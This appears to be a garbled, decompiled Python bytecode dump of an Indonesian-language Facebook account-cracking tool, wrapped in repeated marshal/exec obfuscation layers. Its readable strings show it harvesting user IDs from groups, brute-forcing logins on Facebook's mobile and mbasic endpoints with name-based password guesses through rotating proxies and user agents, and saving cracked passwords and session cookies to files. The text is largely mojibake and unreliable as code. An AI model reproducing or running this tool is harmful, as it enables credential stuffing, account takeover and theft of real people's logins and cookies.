+mengajukanzcontent_owner_id_new.\w+zcontent_owner_id_new.z mengajukan pertanyaan .rª   rÊ   z { zProses Mengambil ID z }©Úendz > zMengumpulkan ID úhttps://mbasic.facebook.comrĞ   rÑ   rÒ   rÓ   é   )rB   rÃ   r   rË   r‘   rÕ   rC   rD   rÙ   rG   rµ   r×   rE   rF   rp   rA   r“   r’   r±   rW   rX   rY   r*   ÚinsertrÖ   rÌ   ry   rz   rZ   r[   ÚKeyboardInterrupt)ZurlsZuserÆ   rI   rÚ   rÛ   ÚsetZbf2ÚgZcssZbcjZbcj2ZtesZcariZliatnihZsplZidsiapaZidyouZnamayouZidkuZlink_ZgirangZgirang2rL   rL   rM   Ú%grup1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx°  s‚   
+€
+
+
+@
+
+@
+
+€
+ÿ€
+ÿÈræ   c            
+      C   s   zt  d¡} W n ty   tdƒ t d¡ tƒ  Y nw t| ƒdkr1tdƒ t d¡ tƒ  d S d}i }| D ]v}ztd| dƒ 	¡ }W n   Y q7|d7 }|d	k rd
+t
+|ƒ }| t
+|ƒt
+|ƒi¡ | |t
+|ƒi¡ tdt› dt› d||t|ƒf ƒ q7| t
+|ƒt
+|ƒi¡ tdt
+|ƒ d | d t
+t|ƒƒ d t ƒ td||t|ƒf ƒ q7tdƒ}z|| }W n tyÒ   tt› dt› ƒ t d¡ tƒ  Y nw ztd| dƒ ¡  ¡ }W n   tdƒ t d¡ tƒ  Y |D ]}	t |	¡ qótƒ  d S )NÚDUMPu   â¥â¥â£File Tidak Ditemukan r¤   r   u'   â¥â¥â£Kamu Tidak Memiliki File Dump zDUMP/r   r   r   r   u   â¥â¥â£%s. %s (z %sz idz )r   r¦   r§   r¨   u    â¥â¥â£%s. %s ({h} %s {u}idz) r    r©   r£   u/   â¥â¥â£File Tidak Ditemukan, Coba Lagi Nanti )r`   r¯   r°   r   rZ   r[   rc   r±   r=   r²   rG   r³   r“   r\   r•   rw   r’   r>   r?   rp   rA   rÅ   )
+r·   r¸   r¹   rº   r»   r¼   r½   r¾   r¿   ZxidrL   rL   rM   Ú/crack_filexxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxñ  sN   
+
+ı
+
+
+&0
+
+ı
+
+rè   c                  C   s,  t tdƒƒ tdƒ t tdƒƒ tdƒ tdƒ} | dv r0tD ]}t dttƒ¡}t 	||¡ qntdƒ t
+ƒ  t tdƒƒ tdƒ t td	ƒƒ tdƒ td
+ƒ}|dv rYt d¡ nt d¡ tdƒ tdƒ}|dv r‰t d¡ t tdƒƒ tdƒ}| d¡}|D ]}t |¡ q€nt d¡ tƒ  t
+ƒ  d S )Nu8   	[bold cyan]         â€¢ Cracking Style â€¢ [/bold cyan]r   z*[bold yellow]1. Random Crack [bold yellow]u   â¥â¥â£Choose : r¡   r   u   â¥â¥â£Pilih Yang Bener gansu:   	[bold cyan]             â€¢ METODE LOGIN â€¢ [/bold cyan]uX   [bold green]â£1. Mobile(Recommanded)
+â£2. Mbasic
+â£3. Touch
+â£4. Mtouch [bold green]z>> Choose : Úmobileu(   â¥â¥â£Use Premium Useragent? (y/n) : )ZxxxxxxxxZxxxxxxxxxxxxxxxxxÚyau†   [[purple]â€¢[yellow]] Masukkan Katasandi Tambahan Minimal 6 Karakter
+[[purple]â€¢[yellow]] Contoh :[green] kakak,ngentod,adik[purple] u'   #â¥â¥â£Masukkan Password Tambahan : ú,Úno)rg   rh   r   r•   rp   r   Zrandintr±   Úid2râ   r|   ÚmethodrA   Úpwplussrµ   ÚpwnyaÚpasswrd)ÚhuZbacotZxxZhcZpwplusZpwkuZpwkuhZxpwrL   rL   rM   rÅ     sB   ş
+	
+
+ÿ
+
+rÅ   c                  C   sè  t tdƒƒ tdƒ tdt› dt› dt› dt› t ƒ tdt› dt› dt› dt› t ƒ td	t› d
+t› dƒ t	ddò} t
+D ]ç}| d¡d | d¡d  ¡ }}| d¡d }g }t|ƒdk rœt|ƒdk rjnt| |d ¡ | |d ¡ | |d ¡ | |d ¡ | |d ¡ | |d ¡ | |d ¡ nBt|ƒdk r¨| |¡ n6| |¡ | |d ¡ | |d ¡ | |d ¡ | |d ¡ | |d ¡ | |d ¡ | |d ¡ dtv rítD ]}| |¡ qän	 dtv rú|  t||¡ qAdtv r|  t||¡ qAdtv r|  t||¡ qAdtv r!|  t||¡ qA|  t||¡ qAW d   ƒ n	1 s4w   Y  tdƒ t td ƒƒ td!t› d"t› d#t› d$t› d%	t ƒ tt› d!t› d"t› d#t› d&t› d't› dt ƒ tdƒ d S )(Nz8[bold cyan]               WISH YOU GOOD LUCK [bold cyan]r   u
+   â¥â¥â£ r¬   z Saved IN : zOK/%s r¢   zCP/%s u+   â¥â¥â£Use Airoplane Mode After Cracking Z1kz Idz
+é   )Zmax_workersrª   r   r   r   é   r£   Z123Z1234Z12345Z123456Z1122Z2021Z2022rê   ré   ZfreeZtouchZmbasicu<   	[purple]â¥â¥â£[green] Crack Complete[purple] <<[yellow] r   r   r   z OK : z%s z CP : z%s)rg   rh   r   r“   r\   r”   Úokcr’   ÚcpcÚtredrí   rµ   Úlowerr±   rA   rï   rğ   rî   ÚsubmitÚcrackÚ	crackfreeÚ
+cracktouchÚcrackmbasicÚokÚcp)ZpoolZyuzongÚidfZnmfZfrsÚpwvZxpwdrL   rL   rM   rñ   Z  sf   $$"
+ÿ
+
+
+Øÿ*&0rñ   c              "   C   s  t  ttttttg¡}tj	 
+dt› dt› dt› t› t› dt› ttƒ› t› dt› dt› t› t› dt› dt› t› t› d|› d ttttƒƒ ¡› t› d¡f tj	 ¡  t  t¡}t  t¡}t ¡ }|D ]%}zt  t¡}d	d
+| i}|j dd|dddddddddddœ¡ | d|  d ¡}	t dt|	j ƒ¡ !d¡t dt|	j ƒ¡ !d¡| dd|dœ}
+d "d d!„ |	j# $¡  %¡ D ƒ¡}|d"7 }dd#dd$d%|ddddddd&ddd'œ}|j&d(|
+d)|i|d*|d+}d,|j# $¡  '¡ v rt(t)d-ƒƒ t*dt+› d.| › d/|› t,› ƒ t-d0t. d1ƒ 
+| d/ | d2 ¡ t/ 0| d/ | ¡ td7 aW  nld3|j# $¡  '¡ v rvtd7 a|j# $¡ }d "d4d!„ |j# $¡  %¡ D ƒ¡}t(t)d5ƒƒ t*dt› d6| › d/|› d/|› d2|› t,› ƒ t-d7t1 d1ƒ 
+| d/ | d/ | d2 ¡ t2t3|ƒ W  nW qb tj4j5yˆ   t6 7d8¡ Y qbw td7 ad S )9NrÊ   Z_NAYEM_r   r;   õ   ]â€”õ   ]â€”[ú{:.0%}ú]  Úhttpz	socks4://zm.facebook.comrO   úŞtext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9úmark.via.gpúsame-originÚcorsÚemptyÚdocumentzhttps://m.facebook.com/úgzip, deflate brúen-GB,en-US;q=0.9,en;q=0.8©ÚHostr‡   r„   rŠ   Údntúx-requested-withúsec-fetch-siteúsec-fetch-modeúsec-fetch-userúsec-fetch-destr…   úaccept-encodingrˆ   ú8https://p.facebook.com/login/device-based/password/?uid=ú)&flow=login_no_pin&refsrc=deprecated&_rdrúname="lsd" value="(.*?)"r   úname="jazoest" value="(.*?)"ú)https://p.facebook.com/login/save-device/Úlogin_no_pin©ZlsdÚjazoestrÄ   ÚnextZflowÚpassú;c                 S   ó   g | ]
+\}}d ||f ‘qS ©z%s=%srL   ©Ú.0ÚkeyÚvaluerL   rL   rM   Ú
+<listcomp>¨  ó    zcrack.<locals>.<listcomp>ú  m_pixel_ratio=2.625; wd=412x756rƒ   zhttps://m.facebook.comú!application/x-www-form-urlencodedzlhttps://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F©r  r‰   r‡   r†   r‹   r„   rŠ   r  r  r  r  r  r…   r  rˆ   úChttps://p.facebook.com/login/device-based/validate-password/?shbl=0rl   F©r›   rn   rŒ   Úallow_redirectsZproxiesÚ
+checkpointu&     [red]     ğŸ˜´ğŸ˜­ CP ğŸ˜­ğŸ˜´ [red]z>> [NAYEM_CP] rª   r¥   rJ   r<   Úc_userc                 S   r#  r$  rL   r%  rL   rL   rM   r)  ¶  r*  u)   [green]      ğŸ€ğŸ¤£ OK  ğŸ¤£ğŸ€[green]z>> [NAYEM_OK] r­   rá   )8r   r   r‘   r’   r“   r”   r\   r™   rW   rX   rH   r+   Úloopr±   rp   r#   rş   rÿ   ÚformatÚfloatrY   r@   Úugen2rB   rÃ   ÚproxrŒ   r³   rC   rE   r–   rG   rD   r—   Újoinrn   Úget_dictÚitemsÚpostÚkeysrg   rh   r   r&   r)   r=   rö   ÚakunrA   rõ   Úcek_apkÚsessionry   rz   rZ   r[   )r   r  ZborI   Úua2rÆ   ÚpwÚnipÚproxsrØ   ÚdataaÚkokiÚheadeÚpoÚcokiÚkukirL   rL   rM   rú   ™  sL   „
+
+
+
+
+(:$ 
+*(
+ÿrú   c                 C   sD  t j d g d‘t› ‘d‘t› ‘d‘t› ‘d‘t› ‘d‘t› ‘t› ‘t› ‘d‘|› ‘tt	ƒ› ‘t› ‘d‘t› ‘d‘t
+› ‘t› ‘t› ‘d‘t› ‘d‘t› ‘t› ‘t› ‘d‘t› ‘d	 tttt	ƒƒ ¡› ‘t› ‘d
+‘¡¡f t j ¡  t t¡}t t¡}t ¡ }|D ]}z|j dddd|dddddddddddœ¡ |jd|d|i|	dtd}t dt|j ƒ¡ !d¡t dt|j ƒ¡ !d¡| d d!|d"œ}d# d$d%„ |j" #¡  $¡ D ƒ¡}|d&7 }dddd'd(d)ddddddd*ddd+œ}	|j%d|d|i|	dtd}
+d,|
+j" #¡  &¡ v r7t't(d-ƒƒ t)d.t*› d/| › d0|› t+› ƒ t,d1t- d2ƒ | d0 | d3 ¡ t. /| d0 | ¡ td7 aW  ned4|j" #¡  &¡ v r‰td7 a|
+j" #¡ }d# d5d%„ |j" #¡  $¡ D ƒ¡}t't(d6ƒƒ t)d.t
+› d/| › d0|› d0|› t+› 	ƒ t,d7t0 d2ƒ | d0 | d3 ¡ t1t2|ƒ W  nW q tj3j4y›   t5 6d8¡ Y qw td7 ad S )9Nr   u
+   ğŸ‡®ğŸ‡© r   ZMbasicr   r;   r  r  r  r  zp.facebook.comrƒ   ú?1rO   r  r  r	  r
+  r  r  zhttps://p.facebook.com/r  r‚   )r  r‰   úsec-ch-ua-mobiler‡   r„   rŠ   r  r  r  r  r  r  r…   r  rˆ   r.  rl   Fr/  r  r   r  r  r  r  r"  c                 S   r#  r$  rL   r%  rL   rL   rM   r)  Ï  r*  zcrackfree.<locals>.<listcomp>r+  zhttps://p.facebook.comr,  z–Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36zlhttps://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2Fr-  r1  uI     [red]     ğŸ˜­ MOHON MAAF ANDA BELUM BERUNTUNG MOHON BERSABAR ğŸ˜­[red]rÊ   z>> rª   r¥   rJ   r<   r2  c                 S   r#  r$  rL   r%  rL   rL   rM   r)  İ  r*  u3   [purple]      ğŸ˜­HELLO THIS MUSLIM-XD ğŸ¤£[purple]r­   rá   )7rW   rX   rH   r8  r+   rš   r”   r3  r±   rp   r#   rş   r’   rÿ   r™   r‘   r4  r5  rY   r   r   r@   r6  rB   rÃ   rŒ   r³   rC   rC  rE   r–   rG   rD   r—   rn   r9  r:  r;  r<  rg   rh   r   r&   r)   r=   rö   r=  rA   rõ   r>  r?  ry   rz   rZ   r[   )r   r  rØ   rI   r@  rÆ   rA  rD  rE  rF  rG  rH  rI  rL   rL   rM   rû   Ã  sF   Ø
+
+
+
+,:$ 
+$ 
+ÿrû   c                  C   sÆ  t  ttttttg¡}td t	t
+ƒ }d}t  t¡}dd| i}t  t¡}t  t¡}t ¡ }	tj d|tt	t
+ƒttt|ƒt|ƒtf ¡ tj ¡  |D ]}
+zü|	j dd|ddd	d
+dddddddœ¡ |	 d|  d ¡}t dt|jƒ¡ d¡t dt|jƒ¡ d¡| dd|
+dœ}|	j ddddd|dd	d
+dddd|  d dddœ¡ |	j d |d!|it!d"|d#}d$ "d%d&„ |j# $¡  %¡ D ƒ¡}|d'7 }d(|j# $¡  &¡ v r$d)t'v rát( )| d* |
+ ¡ t*| |
+ƒ n?d)t+v rt,d+ƒ d,| › d-|
+› }t-|d.d/}t.t-|d0d1ƒ t/d2t0 d3ƒ | d* |
+ d+ ¡ t( )| d* |
+ ¡ td7 anW qKW  n9d4|	j# $¡  &¡ v rHd5d6i}d7t1v rƒ|j# $¡ }d$ "d8d&„ |	j# $¡  %¡ D ƒ¡}t/d9t2 d3ƒ | d* |
+ d* | d+ ¡ t,d+ƒ d,| › d:|
+› d;|› }t-|d<d/}t.t-|d=d1ƒ td7 aW  nÚd)t1v rG|j# $¡ }d$ "d>d&„ |	j# $¡  %¡ D ƒ¡}t/d?t2 d3ƒ | d* |
+ d* | d+ ¡ | }d@}t ¡ }|jdA||dBj}|jdC||dBj}|dD7 }t 3dEt|ƒ¡}d}|D ]}|dF|› dG|dH › dI|d › dJ7 }|d7 }qÚdH}|dK7 }t 3dEt|ƒ¡}dH}|D ]}|d7 }|dL|› dG|dH › dI|d › dM7 }qt,d+ƒ dN| › d:|
+› d;|› dO|› }t-|d<d/}t.t-|dPd1ƒ td7 aW  nnW qKW qK tj4j5y\   t6 7dQ¡ Y qKw td7 ad S )RNr   ú%r  ú	socks5://õ0   %s â˜¬ %s/%s â˜¬ OK:%s â˜¬ CP:%s â˜¬ %s%s%s â˜¬úmbasic.facebook.comrO   r  r  r	  r
+  r  r  zhttps://mbasic.facebook.com/r  r  r  r  r  r  r   r  r  r  r  rƒ   rà   r,  ú=https://mbasic.facebook.com/login/device-based/password/?uid=z6&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdrr-  r.  rl   Fr/  r"  c                 S   r#  r$  rL   r%  rL   rL   rM   r)  ı  r*  zcracktouch.<locals>.<listcomp>r+  r1  rê   rª   r<   õ   [â€¢] ID       : õ    [â€¢] PASSWORD : rq   re   zIlham-Rd CP©rĞ   ú/sdcard/PINK-DATA/CP/rJ   r2  r„   ú·SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]rì   c                 S   r#  r$  rL   r%  rL   rL   rM   r)    r*  z/sdcard/4MBF-DATA/OK/õ   
+[â€¢] PASSWORD : õ   
+[â€¢] COOKIES  : r®   z
+PINK-XD OKc                 S   r#  r$  rL   r%  rL   rL   rM   r)    r*  ú/sdcard/PINK-DATA/OK/r   ú>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive©rn   rŒ   ú<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activeõ:   
+[bold cyan][â€¢] LIST ACTIVE APPLICATIONS :[/bold cyan] 
+ú`</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>ú[bold cyan][r¦   r   r   ú[/bold cyan]
+õ>   
+[bold yellow][â€¢] LIST EXPIRED APPLICATIONS :[/bold yellow]
+ú[bold yellow][ú[/bold yellow]
+õ   [bold green][â€¢] ID       : ú[/bold green]
+ú#[bold green]PINK-XD OK[/bold green]rá   )8r   r   r\   r’   Úkkr”   r“   r¶   r3  r±   rí   r7  r@   r6  rB   rÃ   rW   rX   rH   rş   rÿ   rÁ   rG   r™   rY   rŒ   r³   rC   rE   r–   rD   r—   r;  rF  r8  rn   r9  r:  r<  Úoprekr=  rA   ÚcekerÚprincpr   rh   rg   r=   rö   Ú	taplikasirõ   rF   ry   rz   rZ   r[   ) r   r  ÚbiÚpersÚfffrB  rC  rI   r@  rÆ   rA  rØ   rD  rE  rG  ÚstatuscpÚ	statuscp1ÚheadapprH  rI  ÚstatusokÚ	statusok1ÚuserÚinfoakunr?  Úcek2ÚcekÚapkaktifÚnokÚmunculÚhitÚapkexprL   rL   rM   rü   ë  s   
+
+
+6
+(:4
+ 
+
+
+(
+
+($(ä à!ÿrü   c           !      C   s  t  ttttttg¡}td t	t
+ƒ }d}t  t¡}dd| i}t  t¡}t  t¡}t ¡ }	tj d|tt	t
+ƒttt|ƒt|ƒtf ¡ tj ¡  |D ]1}
+z|	j dddd	|d
+dddddœ
+¡ |	 d|  d ¡}t dt|jƒ¡ d¡t dt|jƒ¡ d¡| dd|
+dœ}d  dd„ |j! "¡  #¡ D ƒ¡}|d7 }i dd“dd“dd“d d“d!d"“d#d	“d$d%“d&d'“d(|“d)d
+“d*d+“d,d“d-d“d.d“d/d|  d “d0d1“d2d3“d4d5i¥}|	j$d6|d7|i|d8|d9}d:|j! "¡  %¡ v rEd;t&v rt' (| d< |
+ ¡ t)| |
+ƒ n?d;t*v r?t+d=ƒ d>| › d?|
+› }t,|d@dA}t-t,|dBdCƒ t.dDt/ dEƒ | d< |
+ d= ¡ t' (| d< |
+ ¡ td7 anW qKW  n9dF|	j! "¡  %¡ v rid(dGi}dHt0v r¤|j! "¡ }d  dId„ |	j! "¡  #¡ D ƒ¡}t.dJt1 dEƒ | d< |
+ d< | d= ¡ t+d=ƒ d>| › dK|
+› dL|› }t,|dMdA}t-t,|dNdCƒ td7 aW  nÚd;t0v rh|j! "¡ }d  dOd„ |	j! "¡  #¡ D ƒ¡}t.dJt1 dEƒ | d< |
+ d< | d= ¡ | }dP}t ¡ }|jdQ||dRj}|jdS||dRj}|dT7 }t 2dUt|ƒ¡}d}|D ]}|dV|› dW|dX › dY|d › dZ7 }|d7 }qûdX}|d[7 }t 2dUt|ƒ¡} dX}| D ]}|d7 }|d\|› dW|dX › dY|d › d]7 }q't+d=ƒ d^| › dK|
+› dL|› d_|› }t,|dMdA}t-t,|d`dCƒ td7 aW  nnW qKW qK tj3j4y}   t5 6da¡ Y qKw td7 ad S )bNr   rL  r  rM  rN  rO  rƒ   rJ  rO   z‡text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r	  r
+  r  r‚   )
+r  r‰   rK  r‡   r„   rŠ   r  r  r  rˆ   rP  r  r  r   r  z.https://mbasic.facebook.com/login/save-device/r  r  r"  c                 S   r#  r$  rL   r%  rL   rL   rM   r)  O  r*  zcrackmbasic.<locals>.<listcomp>r+  r  r‰   z	sec-ch-uaz(" Not A;Brand";v="99", "Chromium";v="98"rK  zsec-ch-ua-platformz	"Android"r‡   r†   rà   r‹   r,  r„   rŠ   r  ZXMLHttpRequestr  r  r  r…   r  zgzip, deflate, brrˆ   z#fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7Z
+connectionÚclosezHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0rl   Fr/  r1  rê   rª   r<   rQ  rR  rq   re   z
+PINK-XD CPrS  rT  rJ   r2  rU  rì   c                 S   r#  r$  rL   r%  rL   rL   rM   r)  e  r*  rX  rV  rW  r®   r¬   c                 S   r#  r$  rL   r%  rL   rL   rM   r)  o  r*  r   rY  rZ  r[  r\  r]  r^  r¦   r   r   r_  r`  ra  rb  rc  rd  re  rá   )7r   r   r\   r’   rf  r”   r“   r¶   r3  r±   rí   r7  r@   r6  rB   rÃ   rW   rX   rH   rş   rÿ   rÁ   rG   r™   rY   rŒ   r³   rC   rE   r–   rD   r—   r8  rn   r9  r:  r;  r<  rg  r=  rA   rh  ri  r   rh   rg   r=   rö   rj  rõ   rF   ry   rz   rZ   r[   )!r   r  rk  rl  rm  rB  rC  rI   r@  rÆ   rA  rØ   rD  rE  rF  rG  rn  ro  rp  rH  rI  rq  rr  rs  rt  r?  ru  rv  rw  rx  ry  rz  r{  rL   rL   rM   rı   ?  s   
+
+
+6
+":z
+
+ 
+
+
+(
+
+($(äâÿrı   c                 C   sÌ  d}ddddd|ddd	d
+ddddddœ}t  ¡ }z”| d¡}t|jd| |ddœ|ddjdƒ}| d¡}i }g d¢}	|dƒD ]}
+|
+ d¡|	v rT| |
+ d¡|
+ d¡i¡ q>t|jdt|d ƒ ||djdƒ}t	dt
+| |tf ƒ tdt d ƒ | d! | d" ¡ td#7 a| d$¡}t|ƒd%kr›t	d&ttf ƒ W d S |D ]}t	d't|jtf ƒ qW d S  tyå } z-t	dt
+| |tf ƒ t	d(ttf ƒ tdt d ƒ | d! | d" ¡ td#7 aW Y d }~d S d }~ww ))NzÑMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]rO  rƒ   rO   rà   r,  ú|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r  r	  ÚnavigaterJ  r  ú:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8úgzip, deflater‚   r-  ú%https://mbasic.facebook.com/login.phprù   ©Zemailr!  rb   T©r›   rŒ   r0  rÏ   Úform©Znhr  Zfb_dtsgzsubmit[Continue]Zcheckpoint_datar•   ro   r(  Úaction©r›   rŒ   ú%s++++ %s|%s ----> CP       %sr¥   rJ   rª   r<   r   Úoptionr   ú2%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)ú%s---> %s%sz>%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s)rB   rÃ   rC   Úsopr;  rD   rÖ   r³   rG   r   r”   r™   r=   rö   rH   rÿ   rÙ   r±   r¶   rf  r˜   r\   )r   rA  rI   ÚheadrÆ   ÚhiÚhoÚjor›   ÚlionÚanjÚkentÚopsiÚopsiiÚcrL   rL   rM   rh    s<   $
+"
+€$ 
+ÿ €ürh  c                  C   s$  t tƒ} d|  }tt|ddƒ ttd t d t d ƒ d}tƒ  t	|dd	¡ d
+}tD ]Q}z/z| 
+d¡d
+ | 
+d¡d }}W n  tyd   t d¡ tdt|tf ƒ tdttf ƒ Y W q.w t ttttttg¡}td||t tƒ|tf dd tj ¡  d}t ¡ }	ddddd|dddddddd d!d"œ}
+|	 d¡}t|	jd#||d$d%œ|
+d&d'jd(ƒ}d)|	j ¡   ¡ v r=zi| !d*¡}i }g d+¢}|d,ƒD ]}| d-¡|v râ| "| d-¡| d.¡i¡ qÌt|	jdt#|d/ ƒ ||
+d0jd(ƒ}td1t||tf ƒ | $d2¡}t |ƒd
+krtd3ttf ƒ n|D ]}td4t|jtf ƒ qW n6   td1t||tf ƒ td5ttf ƒ Y nd6|	j ¡   ¡ v rRtd7t||tf ƒ n
+td8t||tf ƒ |d7 }W q. tj%j&y€   td9ƒ d:}tƒ  t	|d;d	¡ t'ƒ  Y q.w d<}tƒ  t	|dd	¡ t'ƒ  d S )=NzWTerdapat %s Akun Untuk Dicek
+Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih DahuluzCEK OPSIrS  r   r   z] Mulaiz# PROSES CEK OPSI DIMULAIr®   re   r   rª   r   r¤   z%s++++ %s ----> Error      %sz2%s---> Pemisah Tidak Didukung Untuk Program Ini%sz%s---> %s/%s ---> { %s }%sr   rŞ   z{Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36rO  rƒ   rO   rà   r,  r}  r  r	  r~  rJ  r  r  r€  r‚   r-  r  rù   r‚  Trƒ  rÏ   r1  r„  r…  r•   ro   r(  r†  r‡  rˆ  r‰  rŠ  r‹  z#%s---> Tidak Dapat Mengecek Opsi%sr2  z%s++++ %s|%s ----> OK       %sz"%s++++ %s|%s ----> SALAH       %sr   z2# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGIrq   z# DONE)(r±   r=  rg   rh   r•   r\   r“   rf   r   r{   rµ   Ú
+IndexErrorrZ   r[   r”   r™   r   r   r’   rf  r¶   rW   rX   rY   rB   rÃ   rC   rŒ  r;  rD   rn   r9  r<  rÖ   r³   rG   rÙ   ry   rz   r|   )r–  rò   rv  ZloveZkesrp   rA  rk  rI   rÆ   Zheaderr  r  r  r›   r‘  r’  r“  r”  r•  r€   ZdahrL   rL   rM   Úcek_opsi®  sr   
+"
+ü($
+"
+€$
+€
+ü
+r˜  c              	   C   sF  | j dd|idj}t|dƒ}|jddd}dd	„ | d
+¡D ƒ}t|ƒdkr5tdt› dt› dt› dƒ nt	t|ƒƒD ]}tdt
+|d ||  dd¡tf ƒ q;| j dd|idj}t|dƒ}|jddd}dd	„ | d
+¡D ƒ}t|ƒdkr†tdt› dt› dt› dƒ d S t	t|ƒƒD ]}tdt|d ||  dd¡tf ƒ qŒd S )Nr[  rl   rm   rÏ   r„  r;  )rî   c                 S   ó   g | ]}|j ‘qS rL   ©rD   ©r&  ÚirL   rL   rM   r)  ë  ó    zcek_apk.<locals>.<listcomp>Zh3r   z
+ r   ú!z-] opshh tidak ada aplikasi aktif di akun ini.z   %s%s. %s%sr   zDitambahkan padaz Ditambahkan padarY  c                 S   r™  rL   rš  r›  rL   rL   rM   r)  ô  r  z2] opshh tidak ada aplikasi kadaluarsa di akun ini.ZKedaluwarsaz Kedaluwarsa)rC   rD   r   rÖ   rÙ   r±   r   r)   r(   r´   r#   r×   r&   )r?  rl   r   rŒ  r™   Zgamerœ  rL   rL   rM   r>  ç  s"   
+&
+ &ÿr>  Ú__main__zgit pullr¬   r¢   rç   ztouch .prox.txt)–rB   Zbs4rt   r`   rW   r   ZdatetimerZ   rE   Zurllib3ZrichÚbase64Z
+rich.tabler   ÚmeZrich.consoler   rf   r   rŒ  Zconcurrent.futuresr   r÷   r   ZgpZ
+rich.panelr   rh   r   rg   Zrich.markdownr	   r{   Zrich.columnsr
+   rÇ   Zrprintr   Z	rich.textr   ZtekzZinstallZCONr6  r@   ZcokbrutrÃ   rÆ   ri  rC   rD   r7  r=   rH   r˜   r]   r>   r?   r´   ZxdrJ   Z	randranger”   r–  ÚdÚfrå   r“   rœ  Újr’   rN   rA   rK   r   ÚlZuaku2r™   Zuakrp   rí   r3  rş   rÿ   r=  rg  rî   Z	lisensikurj  rs   rÄ   Zlisensikunirï   rğ   r+   r(   r#   r&   r   r0   r*   r)   r5   Zsirr‘   r¶   r\   rf  rØ   rš   ZdicZdic2ZnowZdayZtglrG   ZmonthZblnZyearZthnrõ   rö   r^   r_   rc   ri   rb   rx   rv   rŸ   rÀ   r   rÉ   rË   rÌ   rÜ   ræ   rè   rÅ   rñ   rú   rû   rü   rı   rh  r˜  r>  Ú__name__ra   ÚmkdirrL   rL   rL   rM   Ú<module>   s  H€ÿ<
+B>8
+(($b/(A)@?*(TQ9
+
+õ)ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r  